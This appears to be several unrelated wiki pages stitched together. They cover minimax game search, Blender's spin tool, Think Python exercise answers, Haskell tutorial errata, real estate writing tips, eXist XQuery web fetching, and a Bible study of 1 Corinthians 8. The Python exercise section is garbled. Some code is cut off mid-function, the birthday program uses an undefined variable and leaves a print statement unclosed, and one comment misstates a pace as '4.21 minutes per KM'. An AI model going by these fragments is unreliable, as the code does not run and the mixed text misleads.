Moreover, representing all the possible moves for simple games like tic tac toe is not so difficult but with games like chess, it becomes computationally expensive to represent them all. Therefore, programmers often rely on further algorithms to narrow the search, such as alpha-beta pruning (Moore &amp; Knuth, 1975). This consists of the stopping the calculation of the utility of one node when it is determined that there is no way its value could be higher than that of an adjacent node. For an alternative method called min/max approximation, see Rivest (1988).

Another way of cutting down the search space is to only go to a certain depth, treat the moves at that level as makeshift terminal nodes and determine their values using heuristics. Still, this is problematic in cases where long term planning is necessary (Sadikov &amp; Bratko, 2006). However, this approach can be made more viable by looking for stable stages within a game and using these as intermediate terminal nodes (Scheucher &amp; Kaindl, 1989). Despite these techniques, there is a debate as to whether using a minimax search is actually effective in such complex cases (Sadikov et al., 2005).

Finally, this section only discusses games in which the next state is solely determined by the moves of the players involved. The final frontier of the minimax search are games which involve chance, such as backgammon and poker (Hauk et al., 2006).

[[Image:Blenderceramics.jpg|left|A collection of objects modeled with the spin tool]]

The Spin tool is a great tool for modeling objects you might make on a lathe quickly and easily.

Lathe objects have circular cross sections along a certain axis. That is to say, when you cut such objects perpendicular to a certain axis you'll get circles. Examples of such objects includes rods, poles, wineglasses, and pails. A Blender render at the left shows some of these.

With the Spin tool you only have to &quot;model&quot; half the outline of your object. The object is completed after you spin this outline. A bit of cleanup here and there and your model is finished.

      <text xml:space="preserve">{{Think Python/Page}}

== Chapter 1 ==
See below for Chapter 1 exercises.

=== Exercise 1.4 ===
If you run a 10 kilometer race in 43 minutes 30 seconds, what is your average time per mile? What is your average speed in miles per hour? (Hint: there are 1.61 kilometers in a mile).

&lt;PRE CLASS=&quot;verbatim&quot;&gt;
&gt;&gt;&gt; 10/1.61 # Convert kilometers to miles
6.2111801242236018
&gt;&gt;&gt; (43*60)+30 # Convert time to seconds
2610
&gt;&gt;&gt; 2610/6.2111801242236018 # what is your average time (seconds) per mile
420.21000000000004
&gt;&gt;&gt; 420.21000000000004/60 # what is your average time (minutes) per mile
7.0035000000000007
&gt;&gt;&gt; 60/7.0035000000000007 # Miles per hour
8.5671449989291055
&lt;/PRE&gt;

Comment:
This is not valid, it '''ONLY''' works for 43min and 30 seconds to 10km's.
Python should have a way to do this the proper way.&lt;br /&gt;&lt;br /&gt;
In order to do this the proper way, a person must do something like this.&lt;br /&gt;
43*60 -&gt; convert the minutes to seconds.&lt;br /&gt;
2580+30 -&gt; add the seconds&lt;br /&gt;
2610/10 -&gt; divide by distance&lt;br /&gt;
261/60 -&gt; change seconds into minutes&lt;br /&gt;
4.35 -&gt; is the answer, now you must&lt;br /&gt;
.35*60 -&gt; multiply the number after the decimal with 60&lt;br /&gt;
21 seconds..&lt;br /&gt;
End result = 4.21 minutes per KM, this technique works for all distances and times.

== Chapter 2 ==

=== Exercise 2.1 ===
If you type an integer with a leading zero, you might get a confusing error:

&lt;PRE CLASS=&quot;verbatim&quot;&gt;&amp;gt;&amp;gt;&amp;gt; zipcode = 02492
                  ^
SyntaxError: invalid token
&lt;/PRE&gt;
Other number seem to work, but the results are bizarre:
&lt;PRE CLASS=&quot;verbatim&quot;&gt;&amp;gt;&amp;gt;&amp;gt; zipcode = 02132
&amp;gt;&amp;gt;&amp;gt; print zipcode
1114
&lt;/PRE&gt;

&lt;/DIV&gt;
So python is assuming you want to convert an octal number to a decimal number. In the base 8 numbering system where valid numbers are '''0, 1, 2, 3, 4, 5, 6 and 7'''.
&lt;PRE CLASS=&quot;verbatim&quot;&gt;
Base  8: 00 01 02 03 04 05 06 07 10 11 12 13 14 15 16 17 20 21 22 23 24
Base 10: 00 01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 16 17 18 19 20
&lt;/PRE&gt;
Every 8 numbers we increment the left hand columns. This means that the right most column is the number of 'ones'. The one to the left of that is a tally of the number of 'eights', the one next to that is a tally of a full column of 'eight' times the 'eight column' - 64. The one next to that is 64*8 - 512 and so on.
For more information read [[http://www4.ncsu.edu/unity/lockers/users/f/felder/public/kenny/papers/bases.html Base Eight math]]. 

That is why '''zipcode = 02492''' is invalid as the digit 9 is not a valid octal number. We can do the conversion manually as follows:

&lt;PRE CLASS=&quot;verbatim&quot;&gt;
&gt;&gt;&gt; print 02132
1114
&gt;&gt;&gt; (2*512)+(1*64)+(3*8)+(2*1)
1114
&gt;&gt;&gt; 
&lt;/PRE&gt;

=== Exercise 2.4 ===

The volume of a sphere with radius '''r''' is ''4/3'' &amp;#X3C0; ''r''&lt;SUP&gt;''3''&lt;/SUP&gt;''.
What is the volume of a sphere with radius 5? 

&lt;PRE CLASS=&quot;verbatim&quot;&gt;
&gt;&gt;&gt; pi = 3.1415926535897931
&gt;&gt;&gt; r = 5
&gt;&gt;&gt; 4/3*pi*r**3 # This is the wrong answer
392.69908169872411
&gt;&gt;&gt; r = 5.0 # Radius can be a float here as well, but is not _necessary_.
&gt;&gt;&gt; 4.0/3.0*pi*r**3 # Using floats give the correct answer
523.59877559829886
&gt;&gt;&gt; 
&lt;/PRE&gt;

Suppose the cover price of a book is $24.95, but bookstores get a 40% discount. Shipping costs $3 for the first copy and 75 cents for each additional copy. What is the total wholesale cost for 60 copies?''

&lt;PRE CLASS=&quot;verbatim&quot;&gt;
 $24.95  Cost
  $9.98  Discount per book
 $14.97  Cost per book after discount

If I leave my house at 6:52 am and run 1 mile at an easy pace (8:15 per mile), then 3 miles at tempo (7:12 per mile) and 1 mile at easy pace again, what time do I get home for breakfast?

Answer: '''7:30 am'''

How I did it:
&lt;PRE CLASS=&quot;verbatim&quot;&gt;
&gt;&gt;&gt; start = (6*60+52)*60
&gt;&gt;&gt; easy = (8*60+15)*2
&gt;&gt;&gt; fast = (7*60+12)*3
&gt;&gt;&gt; finish_hour = (start + easy + fast)/(60*60.0)
&gt;&gt;&gt; finish_floored = (start + easy + fast)/(60*60)  #int() function can also be used to get integer value, but isn't taught yet.
&gt;&gt;&gt; finish_minute  = (finish_hour - finish_floored)*60
&gt;&gt;&gt; print 'Finish time was %d:%d' % (finish_hour,finish_minute)
Finish time was 7:30

*** ANOTHER WAY ***
start_time_hr = 6 + 52 / 60.0
easy_pace_hr = (8 + 15 / 60.0 ) / 60.0
tempo_pace_hr = (7 + 12 / 60.0) / 60.0
running_time_hr = 2 * easy_pace_hr + 3 * tempo_pace_hr
breakfast_hr = start_time_hr + running_time_hr
breakfast_min = (breakfast_hr-int(breakfast_hr))*60
breakfast_sec= (breakfast_min-int(breakfast_min))*60

print ('breakfast_hr', int(breakfast_hr) )
print ('breakfast_min', int (breakfast_min) )
print ('breakfast_sec', int (breakfast_sec) )
&gt;&gt;&gt; 
&lt;/PRE&gt;

=== Exercise 3.3 ===
Python provides a built-in function called ''len'' that returns the length of a string, so the value of len('allen') is 5. Write a function named right_justify that takes a string named ''s'' as a parameter and prints the string with enough leading spaces so that the last letter of the string is in column 70 of the display.

&lt;PRE CLASS=&quot;verbatim&quot;&gt;
&gt;&gt;&gt; def right_justify(s):

comment = &quot;&quot;&quot;
After writing a draft of the 4x4 grid, I noticed that many of the
functions had the same structure: they would do something, do
something else four times, and then do something else once.

So I wrote one_four_one, which takes three functions as arguments; it
calls the first one once, then uses do_four to call the second one
four times, then calls the third.

Then I rewrote print1beam, print1post, print4beams, print4posts,
print_row and print_grid using one_four_one.

Programming is an exploratory process.  Writing a draft of a program
often gives you insight into the problem, which might lead you to
rewrite the code to reflect the structure of the solution.

=== Exercise 16.8 ===
1. Use the ''datetime'' module to write a program that gets the current date and prints the day of the week.
&lt;source lang = &quot;python&quot;&gt;
from datetime import date

def current_weekday():
	i = date.today()
	print i.strftime('%A')

current_weekday()
&lt;/source&gt;
2. Write a program that takes a birthday as input and prints the user’s age and the number of days, hours, minutes and seconds until their next birthday.
&lt;source lang = &quot;python&quot;&gt;
# Python3 solution. Replace &quot;input&quot; by &quot;raw_input&quot; for Python2.
from datetime import datetime

def time_until_birthday():
    dob_input = input(('Please enter the date of your birth in '
                       'the format &quot;mm/dd/yyyy&quot;: '))
    dob = datetime.strptime(dob_input, '%m/%d/%Y')
    now = datetime.now()
    if now &gt; datetime(now.year, dob.month, dob.day):
        age = now.year - dob.year

    minutes, seconds = divmod(remainder, 60)
    print(&quot;\nYou are {} years old.&quot;.format(age))
    print((&quot;You have {0} days, {1} hours, {2} minutes and {3} &quot;

&lt;!-- = Errata = --&gt;

This page contains a list of errata which have been discovered so far in the [http://darcs.haskell.org/yaht/yaht.pdf PDF version] of YAHT (some of these may have already been corrected in the [[Haskell/YAHT|online HTML version]] - (imported)).

*  There is a bug in the solution to Exercise 7.1 on page 79, under &quot;7.3  Partial Application&quot; (see [[Haskell/YAHT/Language advanced#Partial Application|Advanced Language: Partial Application]] for the corresponding HTML version (which has already been corrected)), for which the exercise is stated as follows:


{{Exercises|1=
Convert the following functions into point-free style, if possible.

&lt;pre&gt;
[...]

func5 f l = foldr (\x y -&gt; f (y,x)) 0 l
&lt;/pre&gt;}}

* On page 81, text states

&quot;we create a value, call it x, which has value Red. We
then apply this to colorToRGB. We check to see if we can “match” x against Red.
This match fails because according to the definition of Eq Color, Red is not equal
to Yellow.&quot;

Clearly, the premise is wrong, the initial value x should be 'Yellow' in order for the rest of the paragraph to make sense.


* According to the page 172 of the [http://darcs.haskell.org/yaht/yaht.pdf PDF file], the solution is stated as follows:

&lt;pre&gt;
[...]

func5 = foldr (uncurry $ flip f) 0
&lt;/pre&gt;

However, as [http://article.gmane.org/gmane.comp.lang.haskell.beginners/1349 pointed out] by Michael Mossey on the Haskell-Beginners mailing list, that solution is actually incorrect.

Here is the correct solution:

&lt;pre&gt;
[...]

func5 = flip foldr 0 . flip . curry 
&lt;/pre&gt;

As a sidenote, Daniel Fischer has [http://article.gmane.org/gmane.comp.lang.haskell.beginners/1350 provided] a succinct way of verifying correctness of the solutions, using types, as follows:

----
A simple way to check for sanity of the results is:

{{HaskellExample|1=|2=&lt;pre&gt;
Prelude&gt; :t flip foldr 0 . flip. curry
flip foldr 0 . flip. curry :: (Num c) =&gt; ((c, b) -&gt; c) -&gt; [b] -&gt; c

Prelude&gt; :t \f list -&gt; foldr (\x y -&gt; f (y,x)) 0 list
\f list -&gt; foldr (\x y -&gt; f (y,x)) 0 list :: (Num b) =&gt;
                                             ((b, a) -&gt; b) -&gt; [a] -&gt; b

Prelude&gt; :t \f -&gt; foldr (uncurry $ flip f) 0
\f -&gt; foldr (uncurry $ flip f) 0 :: (Num b1) =&gt;
                                    (b -&gt; a -&gt; b1 -&gt; b1) -&gt; [(a, b)] -&gt; b1
&lt;/pre&gt;}}

So you see that your result has the correct type, while Hal's hasn't.
----
In the above-mentioned description, the first pair of two lines show that the type of 

&lt;pre&gt;
flip foldr 0 . flip. curry
&lt;/pre&gt;

(i.e., the solution to verify) is 

&lt;pre&gt;
(Num c) =&gt; ((c, b) -&gt; c) -&gt; [b] -&gt; c
&lt;/pre&gt;

The second pair of two lines show that the type of 

&lt;pre&gt;
\f list -&gt; foldr (\x y -&gt; f (y,x)) 0 list
&lt;/pre&gt;

(i.e., essentially the expression given in the exercise, which was &lt;code&gt;f l = foldr (\x y -&gt; f (y,x)) 0 l&lt;/code&gt;) is also 

&lt;pre&gt;
(Num b) =&gt; ((b, a) -&gt; b) -&gt; [a] -&gt; b
&lt;/pre&gt;

(Note that this is the same type as above, only written with renamed variables.)

The third pair of two lines show that the type of 
&lt;pre&gt;
\f -&gt; foldr (uncurry $ flip f) 0
&lt;/pre&gt;

(i.e., the solution given by Hal in the [http://darcs.haskell.org/yaht/yaht.pdf PDF version] of the tutorial) is 

&lt;pre&gt;
(Num b1) =&gt; (b -&gt; a -&gt; b1 -&gt; b1) -&gt; [(a, b)] -&gt; b1
&lt;/pre&gt;

which is a different type.  Hence, the solution given by Hal is incorrect.

{{warning|1=
YAHT has never been comprehensively proofread, so this is only a partial list.
}}

{{warning|1=
This is still a work in progress.  Feel free to add to it as needed!
}}

2. Exercise 4.11:
{{Exercises|1=
4.11. Test whether the CPS-style fold mimicks either of foldr and foldl. If not, where is the difference?
}}
It does not specify the &quot;CPS-style fold&quot; function, so the reader should assume that the exercise is about the previously defined cfold:
&lt;pre&gt;
cfold’ f z [] = z
cfold’ f z (x:xs) = f x z (\y -&gt; cfold’ f y xs)
cfold f z l = cfold’ (\x t g -&gt; f x (g t)) z l
&lt;/pre&gt;
But the solution given in YAHT is actually not about about this function. In fact, this function behaves exactly as foldr. The solution is about very similar function: the only difference is in the order of arguments for the second case of cfold', namely
&lt;pre&gt;
cfold' f z (x:xs) = f z x (\y -&gt; cfold' f y xs)
&lt;/pre&gt;</text>

      <text xml:space="preserve">Writing Tips for Real Estate Agents

10 years ago, writing wasn’t a necessary task for any agent. In 2009, there’s hardly an agent getting started in real estate that hasn’t heard of a blog, ezinearticles, or digg and the many benefits associated with publishing information online. If you’re already a successful agent, writing will only make you better.

The agent controlling the best and most information in their market wins. Writing doesn’t just help your website rank better, it keeps you informed and connected. Would it make sense for you to write about the same thing over-and-over? By writing, you become an expert in many things, and overtime, people will notice.

If you don’t have time to write, find time, or partner up with someone that can. A new breed of agents that grew up online definitely will. Here are a few tips to help you get the ball rolling…

Enjoy your writing and just get started…

Don’t make your next article or blog post a job. Writing a couple hundred words each day about issues that interest you will help get you into the groove. Write daily about things you take pleasure in, and I can guarantee that all aspects of your writing and communication skills will improve.  Just get started…your career may depend on it.

Practice Makes Perfect

Not all agents are good at writing but every agent can improve their writing with practice. For me, writing is a passion, which continues to get stronger each day. However, without writing every day I could not have written three books, hundreds of articles and hundreds of blog posts. A calendar helps me stay motivated with my writing. One huge calendar and a red marker is all I need to stay consistent and motivated. I draw a big red X each day I write. At the end of each week, I look at the calendar and if I have a row of red Xs, I know I just created content that can bring me leads for months and years.

Use an Outline

When I write, having an outline is essential because it helps me put my ideas in order and “on paper”. This helps me focus on writing, instead of wasting time on another round or two of research. There’s no “set” standard for an outline, just jot down your main topics, and a couple initial thoughts for each (link if needed) and use the outline to stay on topic.

Writing isn’t always fun, but if you get started and write about issues you enjoy, a little practice and an outline may make it more bearable. The Internet changed the real estate game forever and the new breed of agents is going to reach consumers by providing them with information they’re looking for, online, while they’re looking for it.

      <text xml:space="preserve">== Motivation ==
You want a toolkit for pulling information out of web pages, even if those pages are not well formed XML files.

== Method ==
XQuery is an ideal toolkit for manipulating well-formed HTML; you need only use the doc() function, e.g. &lt;nowiki&gt;doc('http://www.example.org/index.html')&lt;/nowiki&gt; or doc('/db/path/to/index.html').  But, if a webpage is not well-formed XML, you will get errors about the source not being well-formed.

Luckily, there are programs that transform HTML files into well-formed XML files.  

eXist provides several such tools.  One is the httpclient module's get function, '''httpclient:get()'''.  To use this function you need to enable the httpclient module, by modifying the conf.xml file so that the module is loaded the next time you start eXist.  Uncomment the following line:

&lt;source lang=&quot;xml&quot;&gt;
   &lt;module class=&quot;org.exist.xquery.modules.httpclient.HTTPClientModule&quot;
      uri=&quot;http://exist-db.org/xquery/httpclient&quot; /&gt;
&lt;/source&gt;

For example the following example performs an '''HTTP GET''' on the list of all the feeds from the IBM web site:
&lt;source lang=&quot;xml&quot;&gt;
let $feeds-url := 'http://www.ibm.com/ibm/syndication/us/en/?cm_re=footer-_-ibmfeeds-_-top_level'
let $data := httpclient:get(xs:anyURI($feeds-url), true(), &lt;Headers/&gt;)
return $data
&lt;/source&gt;

Sometimes the HTML is so malformed that even httpclient:get() will not be able to salvage the HTML.  For example, if an element has two @id elements, you will get the error, &quot;Error XQDY0025: element has more than one attribute 'id'&quot;.  In this case, you may need to download the HTML source and clean up the HTML just enough so that eXist can parse the rest.  Then, store the file in your database, and use the '''util:parse-html()''' function (which passes the text through the Neko HTML parser to make it well-formed).

The following XQuery will clean up HTML (saved as text file, because it is still malformed):
&lt;source lang=&quot;xml&quot;&gt;
let $html-txt := util:binary-to-string(util:binary-doc('/db/html-file-saved-as-text.txt'))
let $data := util:parse-html($html-txt)
return $data
&lt;/source&gt;

== Testing your HTTP Client with an Simple Echo Script ==

Once you have the have the results in 

Source code for echo.xq
&lt;source lang=&quot;xml&quot;&gt;
xquery version &quot;1.0&quot;;
declare namespace httpclient=&quot;http://exist-db.org/xquery/httpclient&quot;;
let $feeds-url := 'http://www.ibm.com/ibm/syndication/us/en/?cm_re=footer-_-ibmfeeds-_-top_level'
let $http-get-data := httpclient:get(xs:anyURI($feeds-url), true(), &lt;Headers/&gt;)
return
&lt;echo-results&gt;
   {$http-get-data}
&lt;/echo-results&gt;
&lt;/source&gt;

      <text xml:space="preserve">== Basic Facts in Need of Elaboration ==

Most scholars believe Paul's letters were the first NT documents produced. They are the earliest surviving Christian literature. His earliest letter dates from ca. A.D. 50. It was probably what we call 1 Thessalonians, although some scholar consider Galatians the earliest. The latest letter written by Paul is probably earlier than the earliest other NT writing.

Thirteen of the twenty-seven NT books bear Paul's name: Romans; 1 and 2 Corinthians; Galatians; Ephesians; Philippians; Colossians; 1 and 2 Thessalonians; 1 and 2 Timothy; Titus; and Philemon. The strict Pauline authorship of nine letters traditionally assigned to Paul is challenged in contemporary scholarship:

  Authentic:  Romans; 1 &amp; 2 Corinthians; Galatians; Philippians; 1 Thessalonians; Philemon
  Debated:    2 Thessalonians; Colossians; Ephesians
  Doubted:    1 &amp; 2 Timothy; Titus
  Denied:     Hebrews

'''Complications with Authorship:'''

'''Food Sacrificed To Idols'''
&lt;sup&gt;1&lt;/sup&gt;Now about food sacrificed to idols: We know that we all possess knowledge.[a] Knowledge puffs up, but love builds up. &lt;sup&gt;2&lt;/sup&gt;The man who thinks he knows something does not yet know as he ought to know. &lt;sup&gt;3&lt;/sup&gt;But the man who loves God is known by God. 

&lt;sup&gt;4&lt;/sup&gt;So then, about eating food sacrificed to idols: We know that an idol is nothing at all in the world and that there is no God but one. &lt;sup&gt;5&lt;/sup&gt;For even if there are so-called gods, whether in heaven or on earth (as indeed there are many &quot;gods&quot; and many &quot;lords&quot;), &lt;sup&gt;6&lt;/sup&gt;yet for us there is but one God, the Father, from whom all things came and for whom we live; and there is but one Lord, Jesus Christ, through whom all things came and through whom we live. 

&lt;sup&gt;7&lt;/sup&gt;But not everyone knows this. Some people are still so accustomed to idols that when they eat such food they think of it as having been sacrificed to an idol, and since their conscience is weak, it is defiled. &lt;sup&gt;8&lt;/sup&gt;But food does not bring us near to God; we are no worse if we do not eat, and no better if we do. 

&lt;sup&gt;9&lt;/sup&gt;Be careful, however, that the exercise of your freedom does not become a stumbling block to the weak. &lt;sup&gt;10&lt;/sup&gt;For if anyone with a weak conscience sees you who have this knowledge eating in an idol's temple, won't he be emboldened to eat what has been sacrificed to idols? &lt;sup&gt;11&lt;/sup&gt;So this weak brother, for whom Christ died, is destroyed by your knowledge. &lt;sup&gt;12&lt;/sup&gt;When you sin against your brothers in this way and wound their weak conscience, you sin against Christ. &lt;sup&gt;13&lt;/sup&gt;Therefore, if what I eat causes my brother to fall into sin, I will never eat meat again, so that I will not cause him to fall.}}

==Explanation==

===Paraphrase===	
1 Introduces the matter of food sacrificed to idols: everyone possess knowledge. Knowledge puffs up people; it makes people arrogant, it makes their ego bigger.  Not everyone possesses love and love builds up oneself and others. 2 Someone who thinks they know something actually does not know anything because they do not have the knowledge of what they should know.  What they should know is God but they are blinded by the knowledge of this world.  3 A man who loves God is known by God.  God is love and recognizes those who love him.

4 Introduces the matter of eating food sacrificed to idols: An idol has no meaning in the world but on the other hand, there is only one God. 5 There could be so-called gods because there are many “gods” and many “lords”, they could be in heaven or they could be on earth. There are many “gods” and many “lords” for non-Christians. 6 But for Christians there is only one God, who is the Father, and he creates all things and we live for God. There is only one Lord for Christians, he is Jesus Christ, and through Jesus Christ we are able to live.  We live through Christ, because he died on the cross for the sins of the world.  People find spiritual life in Christ.

7 Not everyone knows that there is only one God and that through Jesus Christ we are able to live. There are people who eat food sacrificed to idols and that is all that they can think about is that it was sacrificed to idols, so their conscious is weakened more, and are impure.  8 Food does not bring us closer to God nor does it push us further away from God; we are no worse if we don’t eat food that is sacrificed to idols, and we are no better if we do eat food sacrificed to idols.

9 Be careful when you eat food sacrificed to idols so that when you eat this is not a stumbling block to others who are weak. A Christian’s practices should not make another fall in their faith. 10 If anyone, who has a weak conscious, sees you eating food sacrificed to idols in the idol’s temple and knows that you have the knowledge that there is only one God; he is encouraged by your doing to eat the same food. 11 This weak young brother in Christ is now destroyed by your knowledge.  12 Therefore when you sin against your brother in this way and weaken their conscious more, you sin against Christ. 13 If eating sacrificed food to idols causes your brother to sin, then do not eat that food anymore.

Food Sacrificed to Idols''' 

1Now about food sacrificed to idols: We know that we all possess knowledge.[a] Knowledge puffs up, but love builds up. 2The man who thinks he knows something does not yet know as he ought to know. 3But the man who loves God is known by God. 

4So then, about eating food sacrificed to idols: We know that an idol is nothing at all in the world and that there is no God but one. 5For even if there are so-called gods, whether in heaven or on earth (as indeed there are many &quot;gods&quot; and many &quot;lords&quot;), 6yet for us there is but one God, the Father, from whom all things came and for whom we live; and there is but one Lord, Jesus Christ, through whom all things came and through whom we live. 

7But not everyone knows this. Some people are still so accustomed to idols that when they eat such food they think of it as having been sacrificed to an idol, and since their conscience is weak, it is defiled. 8But food does not bring us near to God; we are no worse if we do not eat, and no better if we do. 

9Be careful, however, that the exercise of your freedom does not become a stumbling block to the weak. 10For if anyone with a weak conscience sees you who have this knowledge eating in an idol's temple, won't he be emboldened to eat what has been sacrificed to idols? 11So this weak brother, for whom Christ died, is destroyed by your knowledge. 12When you sin against your brothers in this way and wound their weak conscience, you sin against Christ. 13Therefore, if what I eat causes my brother to fall into sin, I will never eat meat again, so that I will not cause him to fall.

'''1 Corinthians 8 (The Message)

Freedom with Responsibility'''

1-3The question keeps coming up regarding meat that has been offered up to an idol: Should you attend meals where such meat is served, or not? We sometimes tend to think we know all we need to know to answer these kinds of questions—but sometimes our humble hearts can help us more than our proud minds. We never really know enough until we recognize that God alone knows it all. 

4-6Some people say, quite rightly, that idols have no actual existence, that there's nothing to them, that there is no God other than our one God, that no matter how many of these so-called gods are named and worshiped they still don't add up to anything but a tall story. They say—again, quite rightly—that there is only one God the Father, that everything comes from him, and that he wants us to live for him. Also, they say that there is only one Master—Jesus the Messiah—and that everything is for his sake, including us. Yes. It's true. 

7In strict logic, then, nothing happened to the meat when it was offered up to an idol. It's just like any other meat. I know that, and you know that. But knowing isn't everything. If it becomes everything, some people end up as know-it-alls who treat others as know-nothings. Real knowledge isn't that insensitive. 
We need to be sensitive to the fact that we're not all at the same level of understanding in this. Some of you have spent your entire lives eating &quot;idol meat,&quot; and are sure that there's something bad in the meat that then becomes something bad inside of you. An imagination and conscience shaped under those conditions isn't going to change overnight. 

8-9But fortunately God doesn't grade us on our diet. We're neither commended when we clean our plate nor reprimanded when we just can't stomach it. But God does care when you use your freedom carelessly in a way that leads a fellow believer still vulnerable to those old associations to be thrown off track. 

10For instance, say you flaunt your freedom by going to a banquet thrown in honor of idols, where the main course is meat sacrificed to idols. Isn't there great danger if someone still struggling over this issue, someone who looks up to you as knowledgeable and mature, sees you go into that banquet? The danger is that he will become terribly confused—maybe even to the point of getting mixed up himself in what his conscience tells him is wrong. 

11-13Christ gave up his life for that person. Wouldn't you at least be willing to give up going to dinner for him—because, as you say, it doesn't really make any difference? But it does make a difference if you hurt your friend terribly, risking his eternal ruin! When you hurt your friend, you hurt Christ. A free meal here and there isn't worth it at the cost of even one of these &quot;weak ones.&quot; So, never go to these idol-tainted meals if there's any chance it will trip up one of your brothers or sisters. 

'''1 Corinthians 8 (New King James Version)

Be Sensitive to Conscience'''

1 Now concerning things offered to idols: We know that we all have knowledge. Knowledge puffs up, but love edifies. 2 And if anyone thinks that he knows anything, he knows nothing yet as he ought to know. 3 But if anyone loves God, this one is known by Him.

4 Therefore concerning the eating of things offered to idols, we know that an idol is nothing in the world, and that there is no other God but one. 5 For even if there are so-called gods, whether in heaven or on earth (as there are many gods and many lords), 6 yet for us there is one God, the Father, of whom are all things, and we for Him; and one Lord Jesus Christ, through whom are all things, and through whom we live.

7 However, there is not in everyone that knowledge; for some, with consciousness of the idol, until now eat it as a thing offered to an idol; and their conscience, being weak, is defiled. 8 But food does not commend us to God; for neither if we eat are we the better, nor if we do not eat are we the worse. 

9 But beware lest somehow this liberty of yours become a stumbling block to those who are weak. 10 For if anyone sees you who have knowledge eating in an idol’s temple, will not the conscience of him who is weak be emboldened to eat those things offered to idols? 11 And because of your knowledge shall the weak brother perish, for whom Christ died? 12 But when you thus sin against the brethren, and wound their weak conscience, you sin against Christ. 13 Therefore, if food makes my brother stumble, I will never again eat meat, lest I make my brother stumble.

===Observations===

1) What kind of knowledge does everyone possess?

2) If it is worldly knowledge that people possesses, then knowledge makes someone arrogant and makes them proud.

3) If it is heavenly knowledge that people possess, then this knowledge is love and it builds up other people.

4) When we love God, then we are known by God but love doesn’t stop there; people who love God show love to other people so 
that they model God.

5) The “we” mentioned in verse 4 is referring to the Corinthian Christians.

6) Why does Paul follow verse 4 in verse 5 with “For even if there are so-called gods…”? Is it because there were many gods in Corinth and he is just referring back to them to make a point? 

7) Is God the Father and Lord Jesus Christ one?

8) Since God created all things including humans, we are supposed to live for Him; but we have a choice to live for him or not to live for him, a choice to live in love or to live in pride.
9) Not everyone knows that God the Father and Lord Jesus Christ is the one true God, and that is why there are idols. 

10) What are some reasons that some believers have a weak conscience?
a. The Commandments: have no other gods before me.
b. The fear of loosing faith in God.
c. These weak conscience people could know they have a weak conscience and so they have the fear of slipping into temptation.
d. The food is sacrificed to idols so they don’t understand that eating or not eating this food doesn’t make you closer or further away from God.

11) How is eating sacrificed food a freedom?

12) This isn’t just applying to food.  This applies to all aspects of life.  Christians need to build one another up not tear each other down; so if doing something that could tempt a fellow Christian to sin, do not do what ever it is around that person or don’t just do it period because you never know who is watching.

13) Will he really be destroyed or is Paul talking about the person’s faith being weakened?

14) So as Christians we need to be careful in how we use the knowledge of our freedom in Christ Jesus to build fellow Christians up instead of destroying their faith.

15) Our goal is to help people find life in God not find sin.


==Background Information==

===Historical Context===

1 Corinthians is a private letter written by Paul to the Corithians Church. Paul’s writing in this letter was informal (Garland, 19).  It was written from Ephesus probably before the Pentecost in 54 A.D. or 55 A.D.  The purpose of 1 Corinthians was to be a substitute for his absence which encouraged them to change their behavior to one that glorifies God but it was also written as a warning (Garrand, 13-14).  1 Corinthians chapter 8 is the start of the dispute of food sacrificed to idols; this topic continues to chapter 11 verse 1.  The problem was not just of eating food sacrificed to idols but was that this problem could lead to idolatry.  
Garland’s Structure to 1 Corinthians 8:

The dispute of food sacrificed to idols
A. Introduction to the issue of idol food (8:1-6)
B. Refutation of their practice because of its danger to fellow Christians (8:7-13)
      
The city of Corinth was heavily influenced by the Roman cultural values (Garland, 3).  Corinth was a materialistic society, “the value which others place on one’s goods and achievements” (Garland, 4).  The church in Corinth did not have a temple of any sort, instead they met in private homes at night, and partook of the body and blood of Jesus Christ (Garland, 10).  This materialistic society had an effect on the attitude of the Christian church; wealthy members of the church started to compete for followers, and the ones who held worship in their households had a lot influence on fellow members (Garland, 6).  The church of Corinth didn’t seem to be alienated socially and this could be because the church was still living by the secular culture.  “The problem was not that the church was in Corinth but that too much of Corinth was in the church” (Garland, 6).
      
The major religious influence in Corinth was the imperial cult, and because of how the society worked, it was hard for the Corinthians to not be involved in other religious practices (Garland).  Social gatherings normally always had a religious event taking place, and members of the church could have received invitations to banquets at a temple (Garland, 348; Conzelmann, 147).  Garland calls Corinth a religious melting pot.  A problem that occurred in Corinth with religious was that the Roman officials didn’t police private associations but they were upset when a religious action disturbed the peace and security of Corinth (Garland, 9).

===Literary Context===

1 Corinthians chapter 8 deals with the dispute of food sacrificed to idols.  It discusses whether or not “strong” conscience Christians should eat or be involved with food sacrificed to idols because their actions are going to influence the “weak” conscience Christians.  The strong conscience Christians were leading the weak conscience Christians into sin because the weak did not understand that God is the only opinion that matters.  Eating or not eating food sacrificed to idols does not make a person better or less important in the eyes of God; this is what the weak did not understand.  They ate idol food but were not yet fully convinced that this was permissible (Garland, 351).  Paul strongly objected to the strong eating sacrificed idol food when there was a situation in which the weak could stumble, so he instructed the strong to restrict their freedom because of their bonds with their fellow Christians who are weak (Garland, 351).  Not eating food sacrificed to idols to help the weak out is a way of showing love that is the knowledge talked about right at the beginning of Chapter 8 ( Conzelmann, 138).  
	
In talking about knowledge, Paul mentions that all have knowledge; and that “all” is referring to the strong and the weak to show that there is an equal standing (Conzelmann, 140).  Next he says that not all have knowledge (Conzelmann, 140).  There is a difference between worldly knowledge and heavenly knowledge and some of worldly knowledge while others have heavenly knowledge and vice versa.  The Corinthians’ knowledge is not sufficient even in the realm of objective statement; the formal knowledge of the fact that there is one God is not yet insight into the truth about the powers of the world (Conzelmann, 143).  
	
In discussion of the “weak” and the “strong”, this is just referring to the state of a person’s conscience.  The situation of the “weakness” of some people’s consciences creates a problem that neither the weak nor the strong can ignore (Conzelmann, 147).  The strong cannot ignore the problem because their freedom could cause the weak to stumble in sin and the weak cannot ignore it because they need their consciences to grow stronger.  The “weak” does not represent a position in society or class, it just simply means that a person has a weak conscience (Conzelmann, 147).

==Implications==

===Reception===

The original audience was the people in the church of Corinth.  It was mainly written to the Christians with strong consciences because they were the ones who had an impact on the weak conscience Christians in the church.  It still applies to strong conscience Christians in the same way.  

===Influence===

The problem then was that Corinthian Christians were engaging in eating of food sacrificed to idols and this was controversial in that time.  Eating of this food was viewed as idolatry and pagan sacrifices permeated all levels of Greek and Roman society (Gaebelein).  But eating idol sacrificed food was hard to avoid because meat offered at pagan alters were divided up between the priest, offerer, and the sacrifice; but if the priest did not use his portion the meat ended up in the public market (Gaebelein).
      
